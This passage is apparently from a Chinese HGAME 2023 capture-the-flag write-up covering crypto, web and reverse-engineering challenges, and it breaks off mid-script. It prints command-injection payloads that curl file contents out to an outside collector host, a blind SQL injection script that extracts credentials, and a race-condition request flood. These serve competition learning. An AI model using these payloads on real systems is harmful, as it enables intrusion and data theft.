class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">        t = t ^ key[i]</span><br><span class="line">        t = s_substitute(t)</span><br><span class="line">    c = t ^ key[n - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">m_list = [i * <span class="number">0x1111</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">finalkey = [<span class="string">&#x27;&#x27;</span>]*<span class="number">5</span></span><br><span class="line"></span><br><span class="line">dic = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">allc = <span class="built_in">list</span>(product(dic,repeat=<span class="number">5</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> tqdm(allc):</span><br><span class="line">        key = [(<span class="built_in">int</span>(x, <span class="number">16</span>))&lt;&lt;(<span class="number">4</span>*i) <span class="keyword">for</span> x <span class="keyword">in</span> k]</span><br><span class="line">        c_list = [enc(m, key) <span class="keyword">for</span> m <span class="keyword">in</span> m_list]</span><br><span class="line">        out = [(k &gt;&gt; (<span class="number">4</span>*i)) &amp; <span class="number">0xf</span> <span class="keyword">for</span> k <span class="keyword">in</span> c_list]</span><br><span class="line">        <span class="keyword">if</span> out == c[i]:</span><br><span class="line">            <span class="built_in">print</span>(i,k)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                finalkey[j] = k[j] + finalkey[j]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hgame&#123;&#x27;</span>+<span class="string">&#x27;_&#x27;</span>.join(finalkey)+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0 (&#x27;2&#x27;, &#x27;3&#x27;, &#x27;2&#x27;, &#x27;0&#x27;, &#x27;5&#x27;)</span></span><br><span class="line"><span class="comment"># 1 (&#x27;4&#x27;, &#x27;9&#x27;, &#x27;9&#x27;, &#x27;7&#x27;, &#x27;d&#x27;)</span></span><br><span class="line"><span class="comment"># 2 (&#x27;f&#x27;, &#x27;4&#x27;, &#x27;f&#x27;, &#x27;5&#x27;, &#x27;8&#x27;)</span></span><br><span class="line"><span class="comment"># 3 (&#x27;4&#x27;, &#x27;f&#x27;, &#x27;4&#x27;, &#x27;4&#x27;, &#x27;d&#x27;)</span></span><br><span class="line"><span class="comment"># hgame&#123;4f42_f493_4f92_4570_d8d5&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Ping-To-The-Host"><a href="#Ping-To-The-Host" class="headerlink" title="Ping To The Host"></a>Ping To The Host</h3><blockquote><p>一个用来输入ip的ping工具，我可以用它来做些什么？</p></blockquote><p>无回显命令注入，外带即可。空格使用 <code>$IFS$9</code> 绕过。</p><p>列目录：<code>ip=x|curl$IFS$9https://enm8badfmuo0f.x.pipedream.net/?p=`ls$IFS$9/|base64` </code>，得到flag文件名为 <code>flag_is_here_haha</code>；</p><p>读文件：<code>ip=x|curl$IFS$9https://enm8badfmuo0f.x.pipedream.net/?p=`uniq$IFS$9/f*|base64` </code>，得到 <code>aGdhbWV7cDFuR190MF9Db21NNG5EX0V4ZWNVdDFvbl9kQW5nRXJSclJyUnJSIX0K</code>，base64解码得 <code>hgame&#123;p1nG_t0_ComM4nD_ExecUt1on_dAngErRrRrRrR!&#125;</code>。</p><p>​    </p><h3 id="Login-To-Get-My-Gift"><a href="#Login-To-Get-My-Gift" class="headerlink" title="Login To Get My Gift"></a>Login To Get My Gift</h3><blockquote><p>R1esbyfe：“想必你上周已经找到了我留给你的惊喜，这次我又藏了一个” </p><p>兔兔想起了上周R1esbyfe学长教的sql基础知识与运用方法，是时候将他们派上用场了 </p><p>R1esbyfe：“给你个用户名为testuser，密码为testpassword的test账户吧，不过只有真正的管理员才能得到惊喜:D 别想了，管理员用户名可不是admin”</p><p>After login, you can visit: </p><p>/index -&gt; Only for test users </p><p>/home -&gt; Only for admin users</p></blockquote><p>fuzz测试，发现过滤了空格、等号、substr、mid等，等号用 <code>regexp</code> 绕过，<code>substr()</code> 用 <code>right(left())</code> 绕过来取字符。布尔盲注：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://week-3.hgame.lwsec.cn:31673/login&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;if(ascii(right(left((select(database())),&#123;i&#125;),1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;if(ascii(right(left((select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(&quot;L0g1NMe&quot;))),&#123;i&#125;),1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;if(ascii(right(left((select(group_concat(column_name))from(information_schema.columns)where((table_schema)regexp(&quot;L0g1NMe&quot;))),&#123;i&#125;),1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(right(left((select(group_concat(PAssw0rD,&quot;~&quot;,UsErN4me))from(L0g1NMe.User1nf0mAt1on)),<span class="subst">&#123;i&#125;</span>),1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;testuser&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">f&quot;1&#x27;^(<span class="subst">&#123;payload&#125;</span>)^&#x27;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Success!&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>分别得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">database: L0g1NMe</span><br><span class="line">table: User1nf0mAt1on</span><br><span class="line">column: id,PAssw0rD,UsErN4me</span><br><span class="line">flag: WeLc0meT0hgAmE2023~hAPPySqlhgAmE2023HAppYnEwyEAr,testpassword~testuser</span><br></pre></td></tr></table></figure><p>使用账密 <code>WeLc0meT0hgAmE2023/hAPPySqlhgAmE2023HAppYnEwyEAr</code> 登录，得flag：<code>hgame&#123;It_1s_1n7EresT1nG_T0_ExPL0Re_Var10us_Ways_To_Sql1njEct1on&#125;</code>。</p><p>​    </p><h3 id="Gopher-Shop"><a href="#Gopher-Shop" class="headerlink" title="Gopher Shop"></a>Gopher Shop</h3><blockquote><p>今天是大年初二！兔兔迈着开心的步伐走到了一教，据说每逢寒假HGAME期间，300b就会有Vidar大商场，每个进入商场的同学都可以领取10个Vidar币。兔兔在一家叫Gopher Shop的商店面前停下了脚步，Gopher？听说协会的Web手们都会一点Go,也许这是协会学长开的吧。望着橱窗里的商品，攥着手里的10个Vidar币，兔兔走进了商店…</p></blockquote><p>在 <code>/buyProduct</code> 路由处利用竞争买flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req</span>():</span><br><span class="line">    url = <span class="string">&#x27;http://week-3.hgame.lwsec.cn:30875/api/v1/user/buyProduct?product=Flag&amp;number=1&#x27;</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;SESSION=MTY3NDQ5MTUzNHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBY0FCV0ZrYldsdXz3P-nsnRLwqBHiy3dxz3pgu8nGGORBOuHQaWl7ObqsvQ==; session=MTY3NDc0MzkzM3xEdi1CQkFFQ180SUFBUkFCRUFBQUpmLUNBQUVHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dGQUFOaFlXRT18psiHGgZdURTbYwyW0lTiIA-D7mS0kxe9mu-kLSib2NI=&#x27;</span>&#125;</span><br><span class="line">    r = requests.get(url=url, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    threading.Thread(target=req).start()</span><br></pre></td></tr></table></figure><p>最后点击checkflag得到flag：<code>hgame&#123;GopherShop_M@gic_1nt_0verflow&#125;</code>。</p><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="kunmusic"><a href="#kunmusic" class="headerlink" title="kunmusic"></a>kunmusic</h3><blockquote><p>小黑子，露出鸡脚了吧？</p></blockquote><p>kmusic.dll为.NET程序，ILSpy打开，在 <code>Program</code> 类找到类似SMC反调试的异或操作：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"><span class="keyword">using</span> kmusic;</span><br><span class="line"><span class="keyword">using</span> kmusic.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Form1 form1 = <span class="keyword">new</span> Form1();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">ApplicationConfiguration.Initialize();</span><br><span class="line"><span class="built_in">byte</span>[] data = Resources.data;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; data.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line">data[i] ^= <span class="number">104</span>;</span><br><span class="line">&#125;</span><br><span class="line">Activator.CreateInstance(Assembly.Load(data).GetType(<span class="string">&quot;WinFormsLibrary1.Class1&quot;</span>), form1);</span><br><span class="line">Application.Run((Form)(<span class="built_in">object</span>)form1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在资源部分找到 <code>Resources.data</code>，导出，异或104还原出另一个.NET程序，在 <code>Class1</code> 类中找到关键逻辑：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Media;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"><span class="keyword">using</span> kmusic;</span><br><span class="line"><span class="keyword">using</span> kmusic.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Class1</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="built_in">int</span>[] num = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">13</span>];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">music</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//IL_0ade: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line"><span class="comment">//IL_0ae9: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line"><span class="keyword">if</span> (num[<span class="number">0</span>] + <span class="number">52296</span> + num[<span class="number">1</span>] - <span class="number">26211</span> + num[<span class="number">2</span>] - <span class="number">11754</span> + (num[<span class="number">3</span>] ^ <span class="number">0xA114</span>) + num[<span class="number">4</span>] * <span class="number">63747</span> + num[<span class="number">5</span>] - <span class="number">52714</span> + num[<span class="number">6</span>] - <span class="number">10512</span> + num[<span class="number">7</span>] * <span class="number">12972</span> + num[<span class="number">8</span>] + <span class="number">45505</span> + num[<span class="number">9</span>] - <span class="number">21713</span> + num[<span class="number">10</span>] - <span class="number">59122</span> + num[<span class="number">11</span>] - <span class="number">12840</span> + (num[<span class="number">12</span>] ^ <span class="number">0x525F</span>) == <span class="number">12702282</span> &amp;&amp; num[<span class="number">0</span>] - <span class="number">25228</span> + (num[<span class="number">1</span>] ^ <span class="number">0x50DB</span>) + (num[<span class="number">2</span>] ^ <span class="number">0x1FDE</span>) + num[<span class="number">3</span>] - <span class="number">65307</span> + num[<span class="number">4</span>] * <span class="number">30701</span> + num[<span class="number">5</span>] * <span class="number">47555</span> + num[<span class="number">6</span>] - <span class="number">2557</span> + (num[<span class="number">7</span>] ^ <span class="number">0xBF9F</span>) + num[<span class="number">8</span>] - <span class="number">7992</span> + (num[<span class="number">9</span>] ^ <span class="number">0xE079</span>) + (num[<span class="number">10</span>] ^ <span class="number">0xE052</span>) + num[<span class="number">11</span>] + <span class="number">13299</span> + num[<span class="number">12</span>] - <span class="number">50966</span> == <span class="number">9946829</span> &amp;&amp; num[<span class="number">0</span>] - <span class="number">64801</span> + num[<span class="number">1</span>] - <span class="number">60698</span> + num[<span class="number">2</span>] - <span class="number">40853</span> + num[<span class="number">3</span>] - <span class="number">54907</span> + num[<span class="number">4</span>] + <span class="number">29882</span> + (num[<span class="number">5</span>] ^ <span class="number">0x3506</span>) + (num[<span class="number">6</span>] ^ <span class="number">0x533E</span>) + num[<span class="number">7</span>] + <span class="number">47366</span> + num[<span class="number">8</span>] + <span class="number">41784</span> + (num[<span class="number">9</span>] ^ <span class="number">0xD1BA</span>) + num[<span class="number">10</span>] * <span class="number">58436</span> + num[<span class="number">11</span>] * <span class="number">15590</span> + num[<span class="number">12</span>] + <span class="number">58225</span> == <span class="number">2372055</span> &amp;&amp; num[<span class="number">0</span>] + <span class="number">61538</span> + num[<span class="number">1</span>] - <span class="number">17121</span> + num[<span class="number">2</span>] - <span class="number">58124</span> + num[<span class="number">3</span>] + <span class="number">8186</span> + num[<span class="number">4</span>] + <span class="number">21253</span> + num[<span class="number">5</span>] - <span class="number">38524</span> + num[<span class="number">6</span>] - <span class="number">48323</span> + num[<span class="number">7</span>] - <span class="number">20556</span> + num[<span class="number">8</span>] * <span class="number">56056</span> + num[<span class="number">9</span>] + <span class="number">18568</span> + num[<span class="number">10</span>] + <span class="number">12995</span> + (num[<span class="number">11</span>] ^ <span class="number">0x995C</span>) + num[<span class="number">12</span>] + <span class="number">25329</span> == <span class="number">6732474</span> &amp;&amp; num[<span class="number">0</span>] - <span class="number">42567</span> + num[<span class="number">1</span>] - <span class="number">17743</span> + num[<span class="number">2</span>] * <span class="number">47827</span> + num[<span class="number">3</span>] - <span class="number">10246</span> + (num[<span class="number">4</span>] ^ <span class="number">0x3F9C</span>) + num[<span class="number">5</span>] + <span class="number">39390</span> + num[<span class="number">6</span>] * <span class="number">11803</span> + num[<span class="number">7</span>] * <span class="number">60332</span> + (num[<span class="number">8</span>] ^ <span class="number">0x483B</span>) + (num[<span class="number">9</span>] ^ <span class="number">0x12BB</span>) + num[<span class="number">10</span>] - <span class="number">25636</span> + num[<span class="number">11</span>] - <span class="number">16780</span> + num[<span class="number">12</span>] - <span class="number">62345</span> == <span class="number">14020739</span> &amp;&amp; num[<span class="number">0</span>] - <span class="number">10968</span> + num[<span class="number">1</span>] - <span class="number">31780</span> + (num[<span class="number">2</span>] ^ <span class="number">0x7C71</span>) + num[<span class="number">3</span>] - <span class="number">61983</span> + num[<span class="number">4</span>] * <span class="number">31048</span> + num[<span class="number">5</span>] * <span class="number">20189</span> + num[<span class="number">6</span>] + <span class="number">12337</span> + num[<span class="number">7</span>] * <span class="number">25945</span> + (num[<span class="number">8</span>] ^ <span class="number">0x1B98</span>) + num[<span class="number">9</span>] - <span class="number">25369</span> + num[<span class="number">10</span>] - <span class="number">54893</span> + num[<span class="number">11</span>] * <span class="number">59949</span> + (num[<span class="number">12</span>] ^ <span class="number">0x3099</span>) == <span class="number">14434062</span> &amp;&amp; num[<span class="number">0</span>] + <span class="number">16689</span> + num[<span class="number">1</span>] - <span class="number">10279</span> + num[<span class="number">2</span>] - <span class="number">32918</span> + num[<span class="number">3</span>] - <span class="number">57155</span> + num[<span class="number">4</span>] * <span class="number">26571</span> + num[<span class="number">5</span>] * <span class="number">15086</span> + (num[<span class="number">6</span>] ^ <span class="number">0x59CA</span>) + (num[<span class="number">7</span>] ^ <span class="number">0x5B35</span>) + (num[<span class="number">8</span>] ^ <span class="number">0x3FFD</span>) + (num[<span class="number">9</span>] ^ <span class="number">0x5A85</span>) + num[<span class="number">10</span>] - <span class="number">40224</span> + num[<span class="number">11</span>] + <span class="number">31751</span> + num[<span class="number">12</span>] * <span class="number">8421</span> == <span class="number">7433598</span> &amp;&amp; num[<span class="number">0</span>] + <span class="number">28740</span> + num[<span class="number">1</span>] - <span class="number">64696</span> + num[<span class="number">2</span>] + <span class="number">60470</span> + num[<span class="number">3</span>] - <span class="number">14752</span> + (num[<span class="number">4</span>] ^ <span class="number">0x507</span>) + (num[<span class="number">5</span>] ^ <span class="number">0x89C8</span>) + num[<span class="number">6</span>] + <span class="number">49467</span> + num[<span class="number">7</span>] - <span class="number">33788</span> + num[<span class="number">8</span>] + <span class="number">20606</span> + (num[<span class="number">9</span>] ^ <span class="number">0xAF4A</span>) + num[<span class="number">10</span>] * <span class="number">19764</span> + num[<span class="number">11</span>] + <span class="number">48342</span> + num[<span class="number">12</span>] * <span class="number">56511</span> == <span class="number">7989404</span> &amp;&amp; (num[<span class="number">0</span>] ^ <span class="number">0x7132</span>) + num[<span class="number">1</span>] + <span class="number">23120</span> + num[<span class="number">2</span>] + <span class="number">22802</span> + num[<span class="number">3</span>] * <span class="number">31533</span> + (num[<span class="number">4</span>] ^ <span class="number">0x9977</span>) + num[<span class="number">5</span>] - <span class="number">48576</span> + (num[<span class="number">6</span>] ^ <span class="number">0x6F7E</span>) + num[<span class="number">7</span>] - <span class="number">43265</span> + num[<span class="number">8</span>] + <span class="number">22365</span> + num[<span class="number">9</span>] + <span class="number">61108</span> + num[<span class="number">10</span>] * <span class="number">2823</span> + num[<span class="number">11</span>] - <span class="number">30343</span> + num[<span class="number">12</span>] + <span class="number">14780</span> == <span class="number">3504803</span> &amp;&amp; num[<span class="number">0</span>] * <span class="number">22466</span> + (num[<span class="number">1</span>] ^ <span class="number">0xDABF</span>) + num[<span class="number">2</span>] - <span class="number">53658</span> + (num[<span class="number">3</span>] ^ <span class="number">0xB838</span>) + (num[<span class="number">4</span>] ^ <span class="number">0x30DF</span>) + num[<span class="number">5</span>] * <span class="number">59807</span> + num[<span class="number">6</span>] + <span class="number">46242</span> + num[<span class="number">7</span>] + <span class="number">3052</span> + (num[<span class="number">8</span>] ^ <span class="number">0x62BF</span>) + num[<span class="number">9</span>] + <span class="number">30202</span> + num[<span class="number">10</span>] * <span class="number">22698</span> + num[<span class="number">11</span>] + <span class="number">33480</span> + (num[<span class="number">12</span>] ^ <span class="number">0x4175</span>) == <span class="number">11003580</span> &amp;&amp; num[<span class="number">0</span>] * <span class="number">57492</span> + (num[<span class="number">1</span>] ^ <span class="number">0x346D</span>) + num[<span class="number">2</span>] - <span class="number">13941</span> + (num[<span class="number">3</span>] ^ <span class="number">0xBBDC</span>) + num[<span class="number">4</span>] * <span class="number">38310</span> + num[<span class="number">5</span>] + <span class="number">9884</span> + num[<span class="number">6</span>] - <span class="number">45500</span> + num[<span class="number">7</span>] - <span class="number">19233</span> + num[<span class="number">8</span>] + <span class="number">58274</span> + num[<span class="number">9</span>] + <span class="number">36175</span> + (num[<span class="number">10</span>] ^ <span class="number">0x4888</span>) + num[<span class="number">11</span>] * <span class="number">49694</span> + (num[<span class="number">12</span>] ^ <span class="number">0x2501</span>) == <span class="number">25546210</span> &amp;&amp; num[<span class="number">0</span>] - <span class="number">23355</span> + num[<span class="number">1</span>] * <span class="number">50164</span> + (num[<span class="number">2</span>] ^ <span class="number">0x873A</span>) + num[<span class="number">3</span>] + <span class="number">52703</span> + num[<span class="number">4</span>] + <span class="number">36245</span> + num[<span class="number">5</span>] * <span class="number">46648</span> + (num[<span class="number">6</span>] ^ <span class="number">0x12FA</span>) + (num[<span class="number">7</span>] ^ <span class="number">0xA376</span>) + num[<span class="number">8</span>] * <span class="number">27122</span> + (num[<span class="number">9</span>] ^ <span class="number">0xA44A</span>) + num[<span class="number">10</span>] * <span class="number">15676</span> + num[<span class="number">11</span>] - <span class="number">31863</span> + num[<span class="number">12</span>] + <span class="number">62510</span> == <span class="number">11333836</span> &amp;&amp; num[<span class="number">0</span>] * <span class="number">30523</span> + (num[<span class="number">1</span>] ^ <span class="number">0x1F36</span>) + num[<span class="number">2</span>] + <span class="number">39058</span> + num[<span class="number">3</span>] * <span class="number">57549</span> + (num[<span class="number">4</span>] ^ <span class="number">0xD0C0</span>) + num[<span class="number">5</span>] * <span class="number">4275</span> + num[<span class="number">6</span>] - <span class="number">48863</span> + (num[<span class="number">7</span>] ^ <span class="number">0xD88C</span>) + (num[<span class="number">8</span>] ^ <span class="number">0xA40</span>) + (num[<span class="number">9</span>] ^ <span class="number">0x3554</span>) + num[<span class="number">10</span>] + <span class="number">62231</span> + num[<span class="number">11</span>] + <span class="number">19456</span> + num[<span class="number">12</span>] - <span class="number">13195</span> == <span class="number">13863722</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">int</span>[] array = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">47</span>]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">132</span>, <span class="number">47</span>, <span class="number">180</span>, <span class="number">7</span>, <span class="number">216</span>, <span class="number">45</span>, <span class="number">68</span>, <span class="number">6</span>, <span class="number">39</span>, <span class="number">246</span>,</span><br><span class="line"><span class="number">124</span>, <span class="number">2</span>, <span class="number">243</span>, <span class="number">137</span>, <span class="number">58</span>, <span class="number">172</span>, <span class="number">53</span>, <span class="number">200</span>, <span class="number">99</span>, <span class="number">91</span>,</span><br><span class="line"><span class="number">83</span>, <span class="number">13</span>, <span class="number">171</span>, <span class="number">80</span>, <span class="number">108</span>, <span class="number">235</span>, <span class="number">179</span>, <span class="number">58</span>, <span class="number">176</span>, <span class="number">28</span>,</span><br><span class="line"><span class="number">216</span>, <span class="number">36</span>, <span class="number">11</span>, <span class="number">80</span>, <span class="number">39</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">58</span>, <span class="number">236</span>, <span class="number">130</span>,</span><br><span class="line"><span class="number">123</span>, <span class="number">176</span>, <span class="number">24</span>, <span class="number">212</span>, <span class="number">56</span>, <span class="number">89</span>, <span class="number">72</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">string</span> text = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; array.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line">text += (<span class="built_in">char</span>)(array[i] ^ num[i % num.Length]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> SoundPlayer((Stream)Resources.过年鸡).Play();</span><br><span class="line">MessageBox.Show(text);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提取判断条件，用z3求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">132</span>, <span class="number">47</span>, <span class="number">180</span>, <span class="number">7</span>, <span class="number">216</span>, <span class="number">45</span>, <span class="number">68</span>, <span class="number">6</span>, <span class="number">39</span>, <span class="number">246</span>, <span class="number">124</span>, <span class="number">2</span>, <span class="number">243</span>, <span class="number">137</span>, <span class="number">58</span>, <span class="number">172</span>, <span class="number">53</span>, <span class="number">200</span>, <span class="number">99</span>, <span class="number">91</span>, <span class="number">83</span>, <span class="number">13</span>, <span class="number">171</span>, <span class="number">80</span>, <span class="number">108</span>, <span class="number">235</span>, <span class="number">179</span>, <span class="number">58</span>, <span class="number">176</span>, <span class="number">28</span>, <span class="number">216</span>, <span class="number">36</span>, <span class="number">11</span>, <span class="number">80</span>, <span class="number">39</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">58</span>, <span class="number">236</span>, <span class="number">130</span>, <span class="number">123</span>, <span class="number">176</span>, <span class="number">24</span>, <span class="number">212</span>, <span class="number">56</span>, <span class="number">89</span>, <span class="number">72</span>]</span><br><span class="line"></span><br><span class="line">num = [BitVec(<span class="string">f&#x27;num<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(num[<span class="number">0</span>] + 